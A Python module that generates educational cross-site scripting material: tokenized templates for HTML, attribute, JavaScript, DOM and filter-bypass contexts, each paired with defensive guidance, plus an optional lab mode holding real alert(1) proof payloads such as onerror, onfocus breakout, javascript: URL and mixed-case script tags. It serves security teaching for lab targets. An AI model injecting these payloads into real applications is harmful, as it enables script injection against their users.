"""
XSS Payload Module - Educational Generator (Template + Optional Lab Proof)

Reference:
PortSwigger XSS Cheat Sheet
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

DEFAULT MODE:
- NON-EXECUTING tokenized templates (safe educational output)

LAB MODE (explicit via CLI):
- Provides minimal "proof" payload strings for DVWA/Juice Shop screenshots.
- Intended ONLY for authorized labs. Do NOT use on real systems.
"""


class XSSPayloadGenerator:
    TEMPLATE_PREFIX = "[[TEMPLATE_ONLY]]"

    def generate_all_contexts(self):
        items = []
        items.extend(self._html_context())
        items.extend(self._attribute_context())
        items.extend(self._javascript_context())
        items.extend(self._dom_context())
        items.extend(self._bypass_concepts())
        return items

    # -----------------------------------------------------------
    # Helper
    # -----------------------------------------------------------
    def _item(
        self,
        subtype,
        context,
        title,
        template,
        description,
        bypass_explanation="",
        defensive_notes="",
        lab_payload=None,
    ):
        clean_template = template.strip()

        return {
            "type": "XSS",
            "subtype": subtype,
            "context": context,
            "title": title,
            "template": f"{self.TEMPLATE_PREFIX}\n{clean_template}",
            "description": description,
            "bypass_explanation": bypass_explanation,
            "defensive_notes": defensive_notes,
            "is_template": True,
            "labels": ["TEMPLATE_ONLY", "NON_EXECUTING", "EDUCATIONAL"],
            # Optional, used only when user explicitly enables lab mode:
            "lab_payload": lab_payload,
        }

    # -----------------------------------------------------------
    # HTML CONTEXT
    # -----------------------------------------------------------
    def _html_context(self):
        return [
            self._item(
                "Reflected",
                "HTML",
                "HTML body injection concept",
                """
Injection point: <div>[[USER_INPUT]]</div>

Concept: Untrusted input is reflected directly inside HTML body.

Tokenized pattern: <[[HTML_TAG]] [[ATTR_NAME]]="[[ATTR_VALUE]]">
""",
                "Demonstrates reflected XSS when output encoding is missing.",
                "Blocking a single tag name does not fix the vulnerable sink.",
                "Use proper HTML output encoding. Apply CSP as defense-in-depth.",
                lab_payload='<img src=x onerror=alert(1)>',
            ),
            self._item(
                "Stored",
                "HTML",
                "Stored XSS lifecycle concept",
                """
Data flow:
[[USER_INPUT]] -> Database -> Rendered later

Render position:
<div class="comment">[[STORED_INPUT]]</div>
""",
                "Demonstrates stored XSS where malicious input persists.",
                "Stored input increases impact because multiple users are affected.",
                "Encode on output. Use trusted sanitizers for rich text.",
                lab_payload='<svg onload=alert(1)>',
            ),
        ]

    # -----------------------------------------------------------
    # ATTRIBUTE CONTEXT
    # -----------------------------------------------------------
    def _attribute_context(self):
        return [
            self._item(
                "Reflected",
                "Attribute",
                "Quoted attribute breakout concept",
                """
Injection position:
<a href="[[USER_INPUT]]">Link</a>

Conceptual breakout pattern:
" [[EVENT_ATTR]]="[[JS_EXPRESSION]]"
""",
                "Shows how improper quote encoding leads to attribute injection.",
                "Escaping < and > is insufficient if quotes are not encoded.",
                "Apply attribute-context encoding. Always quote attributes.",
                lab_payload='" autofocus onfocus=alert(1) x="',
            ),
            self._item(
                "Reflected",
                "Attribute",
                "Unsafe URL scheme concept",
                """
Injection position:
href="[[USER_INPUT]]"

Concept:
[[URL_SCHEME]]:[[JS_EXPRESSION]]

Encoding representation:
[[ENCODED(URL_SCHEME)]]:[[JS_EXPRESSION]]
""",
                "Demonstrates risk of unsafe URL schemes.",
                "If validation occurs before decoding, encoded values may bypass checks.",
                "Whitelist allowed schemes (http/https). Validate after normalization.",
                lab_payload='javascript:alert(1)',
            ),
        ]

    # -----------------------------------------------------------
    # JAVASCRIPT CONTEXT
    # -----------------------------------------------------------
    def _javascript_context(self):
        return [
            self._item(
                "Reflected",
                "JavaScript",
                "JavaScript string breakout concept",
                """
Injection position:
const q = "[[USER_INPUT]]";

Conceptual pattern:
[[STRING_BREAK]];
[[JS_EXPRESSION]];
[[COMMENT_REST]]
""",
                "Demonstrates the need for JavaScript-context encoding.",
                "HTML encoding alone does not secure JavaScript contexts.",
                "Use JSON serialization instead of concatenation.",
                lab_payload='";alert(1);//',
            ),
            self._item(
                "Reflected",
                "JavaScript",
                "Template literal delimiter concept",
                """
Injection position:
const msg = `Hello [[USER_INPUT]]`;

Conceptual pattern:
[[TEMPLATE_LITERAL_BREAK]]
[[JS_EXPRESSION]]
[[TEMPLATE_LITERAL_RESUME]]
""",
                "Shows risks in ES6 template literals.",
                "Filters that handle only single/double quotes miss backticks.",
                "Avoid embedding raw user data in script blocks.",
                lab_payload='`);alert(1);//',
            ),
        ]

    # -----------------------------------------------------------
    # DOM-BASED
    # -----------------------------------------------------------
    def _dom_context(self):
        return [
            self._item(
                "DOM-based",
                "DOM",
                "Client-side source-to-sink flow",
                """
Source:
[[SOURCE]] (e.g., location.search/hash)

Sink:
[[SINK:innerHTML/document.write]]

Concept:
Untrusted client-side data reaches dangerous sink.
""",
                "Demonstrates DOM-based XSS concept.",
                "Fragment identifiers never reach the server.",
                "Use textContent instead of innerHTML. Sanitize before insertion.",
                # For DVWA/JS sinks, this is a common proof string when inserted into innerHTML:
                lab_payload='<img src=x onerror=alert(1)>',
            ),
            self._item(
                "DOM-based",
                "DOM",
                "Dangerous eval-like sink concept",
                """
Conceptual pattern:
[[SINK:eval/Function/setTimeout(string)]]
([[USER_INPUT]])
""",
                "Highlights code-evaluation sinks.",
                "HTML filtering is irrelevant when input is executed as JS.",
                "Never pass user input to eval-family functions.",
                lab_payload='alert(1)',
            ),
        ]

    # -----------------------------------------------------------
    # BYPASS CONCEPTS
    # -----------------------------------------------------------
    def _bypass_concepts(self):
        return [
            self._item(
                "Bypass",
                "Encoding",
                "Encoding normalization concept",
                """
Raw input:
[[USER_INPUT]]

URL encoded:
[[ENCODED_URL(USER_INPUT)]]

Double encoded:
[[ENCODED_URL(ENCODED_URL(USER_INPUT))]]
""",
                "Demonstrates encoding-based bypass logic.",
                "Filtering before decoding can miss dangerous characters.",
                "Normalize once before validation. Encode per context after validation.",
                # lab payload will be generated via --encode anyway, keep None
                lab_payload=None,
            ),
            self._item(
                "Bypass",
                "Case manipulation",
                "Case sensitivity bypass concept",
                """
Concept:
<[[MIXED_CASE_TOKEN]]>
</[[MIXED_CASE_TOKEN]]>
""",
                "Shows case-insensitive parsing behavior.",
                "Case-sensitive denylist filtering is weak.",
                "Normalize case before validation. Prefer allowlists.",
                lab_payload="<ScRiPt>alert(1)</sCrIpT>",
            ),
            self._item(
                "Bypass",
                "Context switching",
                "Tag/context switching concept",
                """
Alternative contexts:
HTML: <[[HTML_TAG]]>
Attribute: [[EVENT_ATTR]]="[[JS_EXPRESSION]]"
URL: [[URL_SCHEME]]:[[JS_EXPRESSION]]
DOM: [[SINK:innerHTML]]([[USER_INPUT]])
""",
                "Demonstrates attacker pivoting between contexts.",
                "Blocking one vector does not fix the vulnerable sink.",
                "Apply context-aware encoding consistently.",
                lab_payload="<details open ontoggle=alert(1)>",
            ),
        ]
